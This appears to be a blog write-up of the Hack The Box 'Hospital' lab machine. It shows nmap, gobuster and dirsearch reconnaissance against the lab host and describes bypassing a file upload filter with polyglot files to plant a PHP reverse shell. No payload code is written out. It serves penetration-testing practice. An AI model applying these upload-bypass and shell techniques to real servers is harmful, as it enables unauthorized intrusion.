<span>Home</span></a></li><li><a href=/archives/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
<span>Archives</span></a></li><li><a href=/search/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
<span>Search</span></a></li><li><a href=/links/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
<span>Links</span></a></li><div class=menu-bottom-section><li id=i18n-switch><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 5h7"/><path d="M9 3v2c0 4.418-2.239 8-5 8"/><path d="M5 9c-.003 2.144 2.952 3.908 6.7 4"/><path d="M12 20l4-9 4 9"/><path d="M19.1 18h-6.2"/></svg>
<select name=language onchange="window.location.href=this.selectedOptions[0].value"><option value=https://shaanksm.github.io/ selected></option></select></li><li id=dark-mode-toggle><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<span>Dark Mode</span></li></div></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#introduction>Introduction</a></li><li><a href=#matrix>Matrix</a></li><li><a href=#enumeration>Enumeration</a></li><li><a href=#first-foothold>First FootHold</a></li><li><a href=#first-privilege-escalation>First Privilege Escalation</a></li><li><a href=#2supndsup-foothold>2<sup>nd</sup> FootHold</a></li><li><a href=#2supndsup-privilege-esclation>2<sup>nd</sup> Privilege Esclation</a></li></ol></nav></div></section></aside><main class="main full-width"><article class="has-image main-article"><header class=article-header><div class=article-image><a href=/p/hospital-writeup/><img src=/p/hospital-writeup/Hospital_huf99bd53d94772a137012ffdd894b0de4_299993_800x0_resize_box_3.png srcset="/p/hospital-writeup/Hospital_huf99bd53d94772a137012ffdd894b0de4_299993_800x0_resize_box_3.png 800w, /p/hospital-writeup/Hospital_huf99bd53d94772a137012ffdd894b0de4_299993_1600x0_resize_box_3.png 1600w" width=800 height=666 loading=lazy alt="Featured image of post Hospital Writeup"></a></div><div class=article-details><header class=article-category><a href=/categories/hack-the-box/>Hack the Box
</a><a href=/categories/windows/>Windows</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/hospital-writeup/>Hospital Writeup</a></h2><h3 class=article-subtitle>Welcome to "Hospital" on Hack The Box, a dynamic cybersecurity challenge where you'll confront vulnerabilities on both Linux and Windows systems. From upload RCE to hash cracking, you'll tackle a variety of security issues to bolster the hospital's defenses. Get ready for an engaging journey of exploration and skill-building. Let's dive in and make Hospital more secure together.</h3></div><footer class=article-time><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published>Feb 08, 2024</time></div><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>10 minute read</time></div></footer></div></header><section class=article-content><h1 id=hospital-htb---writeup>HOSPITAL HTB - WRITEUP</h1><h2 id=introduction>Introduction</h2><p>Welcome to &ldquo;Hospital&rdquo; on Hack The Box, an immersive cybersecurity challenge designed to test your prowess across both Linux and Windows environments. Within this simulated hospital setting, you&rsquo;ll encounter a diverse array of vulnerabilities, ranging from upload RCE exploits to intricate password hash cracking techniques. Our mission ? Is to navigate through this challenge, leveraging ours skills to strengthen the hospital&rsquo;s security posture.
By delving into the intricacies of both operating systems, we&rsquo;ll gain invaluable experience in penetration testing and vulnerability assessment. Together, let&rsquo;s embark on this journey to fortify Hospital against cyber threats and ensure the safety of its digital infrastructure. Are you ready to rise to the challenge? Let&rsquo;s begin our quest for enhanced security.</p><h2 id=matrix>Matrix</h2><p><img src=/p/hospital-writeup/Hos_Pic/matrix.png width=341 height=302 srcset="/p/hospital-writeup/Hos_Pic/matrix_hube9c41c08d3318888d156519cd1f451e_31505_480x0_resize_box_3.png 480w, /p/hospital-writeup/Hos_Pic/matrix_hube9c41c08d3318888d156519cd1f451e_31505_1024x0_resize_box_3.png 1024w" loading=lazy alt="Matrix&rsquo;s Machine" class=gallery-image data-flex-grow=112 data-flex-basis=270px></p><h2 id=enumeration>Enumeration</h2><p>I kick off the process by enumerating ports using AutoRecon(Tool only for CTF environnemnt, too noisy in real pentest imo&rsquo;) and it appear that we&rsquo;ve an AD ? I&rsquo;m left my dog Bloody outsite ..</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># Nmap 7.94SVN scan initiated Sat Jan 20 17:49:14 2024 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -oN /home/shnks/HTB/Hospital/results/hospital.htb/scans/_quick_tcp_nmap.txt -oX /home/shnks/HTB/Hospital/results/hospital.htb/scans/xml/_quick_tcp_nmap.xml hospital.htb
</span></span><span class=line><span class=cl>Nmap scan report for hospital.htb (10.10.11.241)
</span></span><span class=line><span class=cl>Host is up, received user-set (0.026s latency).
</span></span><span class=line><span class=cl>Scanned at 2024-01-20 17:49:15 CET for 291s
</span></span><span class=line><span class=cl>Not shown: 980 filtered tcp ports (no-response)
</span></span><span class=line><span class=cl>PORT     STATE SERVICE           REASON  VERSION
</span></span><span class=line><span class=cl>22/tcp   open  ssh               syn-ack OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
</span></span><span class=line><span class=cl>| ssh-hostkey: 
</span></span><span class=line><span class=cl>|   256 e1:4b:4b:3a:6d:18:66:69:39:f7:aa:74:b3:16:0a:aa (ECDSA)
</span></span><span class=line><span class=cl>| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEOWkMB0YsRlK8hP9kX0zXBlQ6XzkYCcTXABmN/HBNeupDztdxbCEjbAULKam7TMUf0410Sid7Kw9ofShv0gdQM=
</span></span><span class=line><span class=cl>|   256 96:c1:dc:d8:97:20:95:e7:01:5f:20:a2:43:61:cb:ca (ED25519)
</span></span><span class=line><span class=cl>|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGH/I0Ybp33ljRcWU66wO+gP/WSw8P6qamet4bjvS10R
</span></span><span class=line><span class=cl>53/tcp   open  domain            syn-ack Simple DNS Plus
</span></span><span class=line><span class=cl>88/tcp   open  kerberos-sec      syn-ack Microsoft Windows Kerberos (server time: 2024-01-20 23:49:32Z)
</span></span><span class=line><span class=cl>135/tcp  open  msrpc             syn-ack Microsoft Windows RPC
</span></span><span class=line><span class=cl>139/tcp  open  netbios-ssn       syn-ack Microsoft Windows netbios-ssn
</span></span><span class=line><span class=cl>389/tcp  open  ldap              syn-ack Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
</span></span><span class=line><span class=cl>| ssl-cert: Subject: commonName=DC
</span></span><span class=line><span class=cl>| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
</span></span><span class=line><span class=cl>| Issuer: commonName=DC
</span></span><span class=line><span class=cl>| Public Key type: rsa
</span></span><span class=line><span class=cl>| Public Key bits: 2048
</span></span><span class=line><span class=cl>| Signature Algorithm: sha256WithRSAEncryption
</span></span><span class=line><span class=cl>| Not valid before: 2023-09-06T10:49:03
</span></span><span class=line><span class=cl>| Not valid after:  2028-09-06T10:49:03
</span></span><span class=line><span class=cl>| MD5:   04b1:adfe:746a:788e:36c0:802a:bdf3:3119
</span></span><span class=line><span class=cl>| SHA-1: 17e5:8592:278f:4e8f:8ce1:554c:3550:9c02:2825:91e3
</span></span><span class=line><span class=cl>| -----BEGIN CERTIFICATE-----
</span></span><span class=line><span class=cl>| MIIC+TCCAeGgAwIBAgIQdNv8q6fykq5PQSM0k1YFAjANBgkqhkiG9w0BAQsFADAN
</span></span><span class=line><span class=cl>[..blablabla.]
</span></span><span class=line><span class=cl>| eh2XVUa9NjHJi5hvdH3wy6/jU4UwPED41iuM6Y1rwF/l4J0LmELsmmYZEaWm
</span></span><span class=line><span class=cl>|_-----END CERTIFICATE-----
</span></span><span class=line><span class=cl>443/tcp  open  ssl/http          syn-ack Apache httpd 2.4.56 (OpenSSL/1.1.1t PHP/8.0.28)
</span></span><span class=line><span class=cl>|_ssl-date: TLS randomness does not represent time
</span></span><span class=line><span class=cl>| http-methods: 
</span></span><span class=line><span class=cl>|_  Supported Methods: GET HEAD POST OPTIONS
</span></span><span class=line><span class=cl>|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
</span></span><span class=line><span class=cl>|_http-title: Hospital Webmail :: Welcome to Hospital Webmail
</span></span><span class=line><span class=cl>| ssl-cert: Subject: commonName=localhost
</span></span><span class=line><span class=cl>| Issuer: commonName=localhost
</span></span><span class=line><span class=cl>| Public Key type: rsa
</span></span><span class=line><span class=cl>| Public Key bits: 1024
</span></span><span class=line><span class=cl>| Signature Algorithm: sha1WithRSAEncryption
</span></span><span class=line><span class=cl>| Not valid before: 2009-11-10T23:48:47
</span></span><span class=line><span class=cl>| Not valid after:  2019-11-08T23:48:47
</span></span><span class=line><span class=cl>| MD5:   a0a4:4cc9:9e84:b26f:9e63:9f9e:d229:dee0
</span></span><span class=line><span class=cl>| SHA-1: b023:8c54:7a90:5bfa:119c:4e8b:acca:eacf:3649:1ff6
</span></span><span class=line><span class=cl>| -----BEGIN CERTIFICATE-----
</span></span><span class=line><span class=cl>| MIIBnzCCAQgCCQC1x1LJh4G1AzANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDEwls
</span></span><span class=line><span class=cl>|[..blablabla.]
</span></span><span class=line><span class=cl>| vVNbLkKxbK2XwUvu0RxoLdBMC/89HqrZ0ppiONuQ+X2MtxE=
</span></span><span class=line><span class=cl>|_-----END CERTIFICATE-----
</span></span><span class=line><span class=cl>| tls-alpn: 
</span></span><span class=line><span class=cl>|_  http/1.1
</span></span><span class=line><span class=cl>|_http-favicon: Unknown favicon MD5: 924A68D347C80D0E502157E83812BB23
</span></span><span class=line><span class=cl>445/tcp  open  microsoft-ds?     syn-ack
</span></span><span class=line><span class=cl>464/tcp  open  kpasswd5?         syn-ack
</span></span><span class=line><span class=cl>593/tcp  open  ncacn_http        syn-ack Microsoft Windows RPC over HTTP 1.0
</span></span><span class=line><span class=cl>636/tcp  open  ldapssl?          syn-ack
</span></span><span class=line><span class=cl>| ssl-cert: Subject: commonName=DC
</span></span><span class=line><span class=cl>| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
</span></span><span class=line><span class=cl>| Issuer: commonName=DC
</span></span><span class=line><span class=cl>| Public Key type: rsa
</span></span><span class=line><span class=cl>| Public Key bits: 2048
</span></span><span class=line><span class=cl>| Signature Algorithm: sha256WithRSAEncryption
</span></span><span class=line><span class=cl>| Not valid before: 2023-09-06T10:49:03
</span></span><span class=line><span class=cl>| Not valid after:  2028-09-06T10:49:03
</span></span><span class=line><span class=cl>| MD5:   04b1:adfe:746a:788e:36c0:802a:bdf3:3119
</span></span><span class=line><span class=cl>| SHA-1: 17e5:8592:278f:4e8f:8ce1:554c:3550:9c02:2825:91e3
</span></span><span class=line><span class=cl>| -----BEGIN CERTIFICATE-----
</span></span><span class=line><span class=cl>| MIIC+TCCAeGgAwIBAgIQdNv8q6fykq5PQSM0k1YFAjANBgkqhkiG9w0BAQsFADAN
</span></span><span class=line><span class=cl>[..blablabla.]
</span></span><span class=line><span class=cl>| eh2XVUa9NjHJi5hvdH3wy6/jU4UwPED41iuM6Y1rwF/l4J0LmELsmmYZEaWm
</span></span><span class=line><span class=cl>|_-----END CERTIFICATE-----
</span></span><span class=line><span class=cl>1801/tcp open  msmq?             syn-ack
</span></span><span class=line><span class=cl>2103/tcp open  msrpc             syn-ack Microsoft Windows RPC
</span></span><span class=line><span class=cl>2105/tcp open  msrpc             syn-ack Microsoft Windows RPC
</span></span><span class=line><span class=cl>2107/tcp open  msrpc             syn-ack Microsoft Windows RPC
</span></span><span class=line><span class=cl>2179/tcp open  vmrdp?            syn-ack
</span></span><span class=line><span class=cl>3268/tcp open  ldap              syn-ack Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
</span></span><span class=line><span class=cl>| ssl-cert: Subject: commonName=DC
</span></span><span class=line><span class=cl>| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
</span></span><span class=line><span class=cl>| Issuer: commonName=DC
</span></span><span class=line><span class=cl>| Public Key type: rsa
</span></span><span class=line><span class=cl>| Public Key bits: 2048
</span></span><span class=line><span class=cl>| Signature Algorithm: sha256WithRSAEncryption
</span></span><span class=line><span class=cl>| Not valid before: 2023-09-06T10:49:03
</span></span><span class=line><span class=cl>| Not valid after:  2028-09-06T10:49:03
</span></span><span class=line><span class=cl>| MD5:   04b1:adfe:746a:788e:36c0:802a:bdf3:3119
</span></span><span class=line><span class=cl>| SHA-1: 17e5:8592:278f:4e8f:8ce1:554c:3550:9c02:2825:91e3
</span></span><span class=line><span class=cl>| -----BEGIN CERTIFICATE-----
</span></span><span class=line><span class=cl>| MIIC+TCCAeGgAwIBAgIQdNv8q6fykq5PQSM0k1YFAjANBgkqhkiG9w0BAQsFADAN
</span></span><span class=line><span class=cl>[..blablabla.]
</span></span><span class=line><span class=cl>| eh2XVUa9NjHJi5hvdH3wy6/jU4UwPED41iuM6Y1rwF/l4J0LmELsmmYZEaWm
</span></span><span class=line><span class=cl>|_-----END CERTIFICATE-----
</span></span><span class=line><span class=cl>3269/tcp open  globalcatLDAPssl? syn-ack
</span></span><span class=line><span class=cl>| ssl-cert: Subject: commonName=DC
</span></span><span class=line><span class=cl>| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
</span></span><span class=line><span class=cl>| Issuer: commonName=DC
</span></span><span class=line><span class=cl>| Public Key type: rsa
</span></span><span class=line><span class=cl>| Public Key bits: 2048
</span></span><span class=line><span class=cl>| Signature Algorithm: sha256WithRSAEncryption
</span></span><span class=line><span class=cl>| Not valid before: 2023-09-06T10:49:03
</span></span><span class=line><span class=cl>| Not valid after:  2028-09-06T10:49:03
</span></span><span class=line><span class=cl>| MD5:   04b1:adfe:746a:788e:36c0:802a:bdf3:3119
</span></span><span class=line><span class=cl>| SHA-1: 17e5:8592:278f:4e8f:8ce1:554c:3550:9c02:2825:91e3
</span></span><span class=line><span class=cl>| -----BEGIN CERTIFICATE-----
</span></span><span class=line><span class=cl>| MIIC+TCCAeGgAwIBAgIQdNv8q6fykq5PQSM0k1YFAjANBgkqhkiG9w0BAQsFADAN
</span></span><span class=line><span class=cl>[..blablabla.]
</span></span><span class=line><span class=cl>| eh2XVUa9NjHJi5hvdH3wy6/jU4UwPED41iuM6Y1rwF/l4J0LmELsmmYZEaWm
</span></span><span class=line><span class=cl>|_-----END CERTIFICATE-----
</span></span><span class=line><span class=cl>3389/tcp open  ms-wbt-server     syn-ack Microsoft Terminal Services
</span></span><span class=line><span class=cl>| ssl-cert: Subject: commonName=DC.hospital.htb
</span></span><span class=line><span class=cl>| Issuer: commonName=DC.hospital.htb
</span></span><span class=line><span class=cl>| Public Key type: rsa
</span></span><span class=line><span class=cl>| Public Key bits: 2048
</span></span><span class=line><span class=cl>| Signature Algorithm: sha256WithRSAEncryption
</span></span><span class=line><span class=cl>| Not valid before: 2023-09-05T18:39:34
</span></span><span class=line><span class=cl>| Not valid after:  2024-03-06T18:39:34
</span></span><span class=line><span class=cl>| MD5:   0c8a:ebc2:3231:590c:2351:ebbf:4e1d:1dbc
</span></span><span class=line><span class=cl>| SHA-1: af10:4fad:1b02:073a:e026:eef4:8917:734b:f8e3:86a7
</span></span><span class=line><span class=cl>| -----BEGIN CERTIFICATE-----
</span></span><span class=line><span class=cl>| MIIC4jCCAcqgAwIBAgIQJ8MSkg5FM7tDDww5/eWcbjANBgkqhkiG9w0BAQsFADAa
</span></span><span class=line><span class=cl>| [..blablabla.]
</span></span><span class=line><span class=cl>| zXOe5MnTuI+omoq6zEeUs5It4jL1Yg==
</span></span><span class=line><span class=cl>|_-----END CERTIFICATE-----
</span></span><span class=line><span class=cl>| rdp-ntlm-info: 
</span></span><span class=line><span class=cl>|   Target_Name: HOSPITAL
</span></span><span class=line><span class=cl>|   NetBIOS_Domain_Name: HOSPITAL
</span></span><span class=line><span class=cl>|   NetBIOS_Computer_Name: DC
</span></span><span class=line><span class=cl>|   DNS_Domain_Name: hospital.htb
</span></span><span class=line><span class=cl>|   DNS_Computer_Name: DC.hospital.htb
</span></span><span class=line><span class=cl>|   DNS_Tree_Name: hospital.htb
</span></span><span class=line><span class=cl>|   Product_Version: 10.0.17763
</span></span><span class=line><span class=cl>|_  System_Time: 2024-01-20T23:53:25+00:00
</span></span><span class=line><span class=cl>8080/tcp open  http              syn-ack Apache httpd 2.4.55 ((Ubuntu))
</span></span><span class=line><span class=cl>|_http-open-proxy: Proxy might be redirecting requests
</span></span><span class=line><span class=cl>|_http-server-header: Apache/2.4.55 (Ubuntu)
</span></span><span class=line><span class=cl>| http-methods: 
</span></span><span class=line><span class=cl>|_  Supported Methods: GET HEAD POST OPTIONS
</span></span><span class=line><span class=cl>| http-title: Login
</span></span><span class=line><span class=cl>|_Requested resource was login.php
</span></span><span class=line><span class=cl>| http-cookie-flags: 
</span></span><span class=line><span class=cl>|   /: 
</span></span><span class=line><span class=cl>|     PHPSESSID: 
</span></span><span class=line><span class=cl>|_      httponly flag not set
</span></span><span class=line><span class=cl>Service Info: Hosts: DC, www.example.com; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows
</span></span></code></pre></td></tr></table></div></div><p>Meanwhile I did gobuster to enumerate, and I seen 3 other subdomain</p><p><code>gobuster dns -d hospital.htb -r hospital.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt</code></p><p><img src=/p/hospital-writeup/Hos_Pic/image.png width=1234 height=527 srcset="/p/hospital-writeup/Hos_Pic/image_hu2e4310c3ecd6ca1f8d9be258a54346c9_84955_480x0_resize_box_3.png 480w, /p/hospital-writeup/Hos_Pic/image_hu2e4310c3ecd6ca1f8d9be258a54346c9_84955_1024x0_resize_box_3.png 1024w" loading=lazy class=gallery-image data-flex-grow=234 data-flex-basis=561px></p><p>We also run a path enumeration with dirsearch to find our first entry point. Other port enumerations yielded no fruitful results, no users for ASREPRoastable enumeration, LDAP enumeration impossible (both null and anonymous sessions), no transfers on port 53, and IPv6 address can be disregarded.</p><p><code>dirsearch -u http://dc.hospital.htb:8080 --exclude-status 400,401,402,403,404,500,501,502,503,504</code></p><p><img src=/p/hospital-writeup/Hos_Pic/image-2.png width=952 height=631 srcset="/p/hospital-writeup/Hos_Pic/image-2_hu97f203f4532b51abbcb223fe0dee8f78_153251_480x0_resize_box_3.png 480w, /p/hospital-writeup/Hos_Pic/image-2_hu97f203f4532b51abbcb223fe0dee8f78_153251_1024x0_resize_box_3.png 1024w" loading=lazy class=gallery-image data-flex-grow=150 data-flex-basis=362px></p><p>Port 443 is open, but after multiple attempts to bypass authentication, reading code, we&rsquo;ll leave it for later. It may prove useful in the future.</p><p><img src=/p/hospital-writeup/Hos_Pic/image-8.png width=1819 height=605 srcset="/p/hospital-writeup/Hos_Pic/image-8_hu082ae2f37fc5ba4853b066807d6235c3_41086_480x0_resize_box_3.png 480w, /p/hospital-writeup/Hos_Pic/image-8_hu082ae2f37fc5ba4853b066807d6235c3_41086_1024x0_resize_box_3.png 1024w" loading=lazy alt="Port 443" class=gallery-image data-flex-grow=300 data-flex-basis=721px></p><p><img src=/p/hospital-writeup/Hos_Pic/image-1.png width=1901 height=699 srcset="/p/hospital-writeup/Hos_Pic/image-1_hu5847c4d6becd6f491397024ced5809b2_659115_480x0_resize_box_3.png 480w, /p/hospital-writeup/Hos_Pic/image-1_hu5847c4d6becd6f491397024ced5809b2_659115_1024x0_resize_box_3.png 1024w" loading=lazy class=gallery-image data-flex-grow=271 data-flex-basis=652px></p><p>Once connected, we can upload files, which seems promising as it&rsquo;s the only functionality available after login. This appears to be the only path forward.</p><p><img src=/p/hospital-writeup/Hos_Pic/image-3.png width=1896 height=754 srcset="/p/hospital-writeup/Hos_Pic/image-3_hu88e9b2af2ddeb7131c0a3d5d937d8448_775776_480x0_resize_box_3.png 480w, /p/hospital-writeup/Hos_Pic/image-3_hu88e9b2af2ddeb7131c0a3d5d937d8448_775776_1024x0_resize_box_3.png 1024w" loading=lazy class=gallery-image data-flex-grow=251 data-flex-basis=603px></p><p>When uploading a PNG, GIF, or JPEG file, we&rsquo;re redirected to <strong>success.php.</strong>; otherwise, to .<strong>failed.php.</strong><br>After some research, we can bypass this with what&rsquo;s known as a <em>&ldquo;polyglot file&rdquo;.</em></p><p><img src=/p/hospital-writeup/Hos_Pic/image-4.png width=1460 height=709 srcset="/p/hospital-writeup/Hos_Pic/image-4_hub988252a687ca998cda4defd31c0050e_96581_480x0_resize_box_3.png 480w, /p/hospital-writeup/Hos_Pic/image-4_hub988252a687ca998cda4defd31c0050e_96581_1024x0_resize_box_3.png 1024w" loading=lazy class=gallery-image data-flex-grow=205 data-flex-basis=494px></p><p><img src=/p/hospital-writeup/Hos_Pic/image-5.png width=1598 height=750 srcset="/p/hospital-writeup/Hos_Pic/image-5_hu7e8826c03464de5cf6ddc77e86b3fd89_107018_480x0_resize_box_3.png 480w, /p/hospital-writeup/Hos_Pic/image-5_hu7e8826c03464de5cf6ddc77e86b3fd89_107018_1024x0_resize_box_3.png 1024w" loading=lazy class=gallery-image data-flex-grow=213 data-flex-basis=511px> aussi pour extension phps / pgif</p><p><img src=/p/hospital-writeup/Hos_Pic/image-7.png width=1194 height=458 srcset="/p/hospital-writeup/Hos_Pic/image-7_hude54d970e1a8d2400ec21d9173a49385_68107_480x0_resize_box_3.png 480w, /p/hospital-writeup/Hos_Pic/image-7_hude54d970e1a8d2400ec21d9173a49385_68107_1024x0_resize_box_3.png 1024w" loading=lazy class=gallery-image data-flex-grow=260 data-flex-basis=625px></p><p>These article help me a lot :<br><a class=link href=https://book.hacktricks.xyz/pentesting-web/file-upload#file-upload-general-methodology target=_blank rel=noopener>https://book.hacktricks.xyz/pentesting-web/file-upload#file-upload-general-methodology</a></p><p><a class=link href=https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a target=_blank rel=noopener>https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a</a></p><p>After injecting a PHP reverse shell, it was impossible to establish an incoming connection from the machine.
